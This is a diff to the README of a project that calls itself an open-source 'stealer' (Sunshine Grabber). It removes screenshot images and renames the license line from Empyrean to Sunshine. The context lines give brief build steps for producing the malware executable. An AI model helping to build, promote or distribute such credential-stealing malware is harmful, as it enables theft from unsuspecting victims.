@@ -44,14 +44,6 @@ Sunshine Grabber The best Open Source Stealer.
 4. Run the builder by double clicking the `Builder.exe` file
 5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `main.exe`
 
-<div align="center">
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/bu0.png"></img>
-    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em0.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em1.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em2.png"></img>
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="img/em3.png"></img>
-</div>
 
 ## Contributing
 
@@ -59,11 +51,9 @@ View the [contributing guidelines](CONTRIBUTING.md) for more information on how 
 
 ## License
 
-Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a>.
+Sunshine is licensed under the <a href="https://mit-license.org/">MIT License</a>.
 
 ## Errors?
 
 -   Make an [issue]()
 -   Join the [Discord]()
-
-<img src="img/footer.png">
